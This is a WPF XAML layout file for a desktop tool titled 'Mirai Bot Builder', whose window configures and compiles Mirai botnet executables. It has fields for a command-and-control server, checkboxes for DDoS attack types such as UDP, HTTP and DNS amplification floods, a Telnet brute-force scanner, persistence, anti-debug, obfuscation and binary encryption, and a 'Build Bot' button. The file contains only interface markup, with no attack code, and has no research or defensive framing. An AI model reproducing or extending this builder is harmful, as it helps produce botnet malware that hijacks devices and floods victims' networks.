<Window x:Class="MiraiBotBuilder.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Mirai Bot Builder"
    Height="700"
    Width="900"
        WindowStartupLocation="CenterScreen"
        ResizeMode="CanMinimize">

  <Window.Resources>
    <Style TargetType="GroupBox">
      <Setter Property="Margin"
          Value="10"/>
      <Setter Property="Padding"
          Value="10"/>
    </Style>
    <Style TargetType="TextBox">
      <Setter Property="Margin"
          Value="5"/>
      <Setter Property="Height"
          Value="25"/>
    </Style>
    <Style TargetType="CheckBox">
      <Setter Property="Margin"
          Value="5"/>
    </Style>
    <Style TargetType="Button">
      <Setter Property="Margin"
          Value="5"/>
      <Setter Property="Height"
          Value="35"/>
      <Setter Property="FontSize"
          Value="14"/>
    </Style>
  </Window.Resources>

  <Grid Background="#1e1e1e">
    <Grid.RowDefinitions>
      <RowDefinition Height="Auto"/>
      <RowDefinition Height="*"/>
      <RowDefinition Height="Auto"/>
      <RowDefinition Height="100"/>
    </Grid.RowDefinitions>

    <!-- Header -->
    <Border Grid.Row="0"
        Background="#2d2d30"
        Padding="15">
      <StackPanel>
        <TextBlock Text="🤖 Mirai Bot Builder"
            FontSize="24"
            FontWeight="Bold"
            Foreground="White"/>
        <TextBlock Text="Configure and compile custom Mirai bot executables"
            FontSize="12"
            Foreground="Gray"
            Margin="0,5,0,0"/>
      </StackPanel>
    </Border>

    <!-- Main Content -->
    <ScrollViewer Grid.Row="1"
        VerticalScrollBarVisibility="Auto">
      <StackPanel Margin="10">

        <!-- C&C Configuration -->
        <GroupBox Header="C&amp;C Server Configuration"
            Foreground="White"
            BorderBrush="LightBlue">
          <Grid>
            <Grid.ColumnDefinitions>
              <ColumnDefinition Width="150"/>
              <ColumnDefinition Width="*"/>
            </Grid.ColumnDefinitions>
            <Grid.RowDefinitions>
              <RowDefinition Height="Auto"/>
              <RowDefinition Height="Auto"/>
              <RowDefinition Height="Auto"/>
            </Grid.RowDefinitions>

            <TextBlock Grid.Row="0"
                Grid.Column="0"
                Text="C&amp;C IP Address:"
                VerticalAlignment="Center"
                Foreground="LightGray"/>
            <TextBox Grid.Row="0"
                Grid.Column="1"
                x:Name="txtCncIp"
                Text="127.0.0.1"/>

            <TextBlock Grid.Row="1"
                Grid.Column="0"
                Text="C&amp;C Port:"
                VerticalAlignment="Center"
                Foreground="LightGray"/>
            <TextBox Grid.Row="1"
                Grid.Column="1"
                x:Name="txtCncPort"
                Text="23"/>

            <TextBlock Grid.Row="2"
                Grid.Column="0"
                Text="Bot Version:"
                VerticalAlignment="Center"
                Foreground="LightGray"/>
            <TextBox Grid.Row="2"
                Grid.Column="1"
                x:Name="txtBotVersion"
                Text="1.0"/>
          </Grid>
        </GroupBox>

        <!-- Attack Vectors -->
        <GroupBox Header="Attack Vectors"
            Foreground="White"
            BorderBrush="LightGreen">
          <WrapPanel>
            <CheckBox x:Name="chkAttackUDP"
                Content="UDP Flood"
                IsChecked="True"
                Foreground="LightGray"/>
            <CheckBox x:Name="chkAttackTCP"
                Content="TCP SYN/ACK"
                IsChecked="True"
                Foreground="LightGray"/>
            <CheckBox x:Name="chkAttackHTTP"
                Content="HTTP Flood"
                IsChecked="True"
                Foreground="LightGray"/>
            <CheckBox x:Name="chkAttackDNS"
                Content="DNS Amplification"
                IsChecked="False"
                Foreground="LightGray"/>
            <CheckBox x:Name="chkAttackGRE"
                Content="GRE Flood"
                IsChecked="False"
                Foreground="LightGray"/>
            <CheckBox x:Name="chkAttackVSE"
                Content="VSE Attack"
                IsChecked="False"
                Foreground="LightGray"/>
          </WrapPanel>
        </GroupBox>

        <!-- Features -->
        <GroupBox Header="Bot Features"
            Foreground="White"
            BorderBrush="Orange">
          <StackPanel>
            <CheckBox x:Name="chkScanner"
                Content="Include Scanner (Telnet Brute Force)"
                IsChecked="True"
                Foreground="LightGray"/>
            <CheckBox x:Name="chkKiller"
                Content="Include Process Killer"
                IsChecked="True"
                Foreground="LightGray"/>
            <CheckBox x:Name="chkPersistence"
                Content="Enable Persistence (Registry/Startup)"
                IsChecked="True"
                Foreground="LightGray"/>
            <CheckBox x:Name="chkAntiDebug"
                Content="Anti-Debug Protection"
                IsChecked="False"
                Foreground="LightGray"/>
            <CheckBox x:Name="chkDebugMode"
                Content="Enable Debug Output"
                IsChecked="False"
                Foreground="LightGray"/>
          </StackPanel>
        </GroupBox>

        <!-- Build Options -->
        <GroupBox Header="Build Options"
            Foreground="White"
            BorderBrush="Pink">
          <Grid>
            <Grid.ColumnDefinitions>
              <ColumnDefinition Width="150"/>
              <ColumnDefinition Width="*"/>
            </Grid.ColumnDefinitions>
            <Grid.RowDefinitions>
              <RowDefinition Height="Auto"/>
              <RowDefinition Height="Auto"/>
              <RowDefinition Height="Auto"/>
              <RowDefinition Height="Auto"/>
            </Grid.RowDefinitions>

            <TextBlock Grid.Row="0"
                Grid.Column="0"
                Text="Output File:"
                VerticalAlignment="Center"
                Foreground="LightGray"/>
            <StackPanel Grid.Row="0"
                Grid.Column="1"
                Orientation="Horizontal">
              <TextBox x:Name="txtOutputFile"
                  Width="400"
                  Text="mirai_bot.exe"/>
              <Button Content="Browse..."
                  Width="100"
                  Click="BrowseOutput_Click"/>
            </StackPanel>

            <TextBlock Grid.Row="1"
                Grid.Column="0"
                Text="Bot Source ID:"
                VerticalAlignment="Center"
                Foreground="LightGray"/>
            <TextBox Grid.Row="1"
                Grid.Column="1"
                x:Name="txtSourceId"
                Text="PRODUCTION"/>

            <TextBlock Grid.Row="2"
                Grid.Column="0"
                Text="Obfuscation:"
                VerticalAlignment="Center"
                Foreground="LightGray"/>
            <CheckBox Grid.Row="2"
                Grid.Column="1"
                x:Name="chkObfuscate"
                Content="Obfuscate strings and encrypt binary"
                Foreground="LightGray"/>

            <TextBlock Grid.Row="3"
                Grid.Column="0"
                Text="Encryption:"
                VerticalAlignment="Center"
                Foreground="LightGray"/>
            <StackPanel Grid.Row="3"
                Grid.Column="1"
                Orientation="Horizontal">
              <CheckBox x:Name="chkEncrypt"
                  Content="Encrypt output with Rawr"
                  Foreground="LightGray"/>
              <TextBox x:Name="txtEncryptPassword"
                  Width="200"
                  PasswordChar="*"
                  ToolTip="Encryption password"/>
            </StackPanel>
          </Grid>
        </GroupBox>

      </StackPanel>
    </ScrollViewer>

    <!-- Build Button -->
    <Border Grid.Row="2"
        Background="#2d2d30"
        Padding="10">
      <Button x:Name="btnBuild"
          Content="🔨 Build Bot"
          Click="Build_Click"
              Background="DarkGreen"
          Foreground="White"
          FontWeight="Bold"
          Height="50"
          FontSize="18"/>
    </Border>

    <!-- Output Log -->
    <GroupBox Grid.Row="3"
        Header="Build Log"
        Foreground="White"
        BorderBrush="Gray"
        Margin="10,0,10,10">
      <ScrollViewer VerticalScrollBarVisibility="Auto">
        <TextBox x:Name="txtLog"
            IsReadOnly="True"
            Background="#1e1e1e"
            Foreground="Lime"
                 FontFamily="Consolas"
            TextWrapping="Wrap"
            BorderThickness="0"/>
      </ScrollViewer>
    </GroupBox>
  </Grid>
</Window>
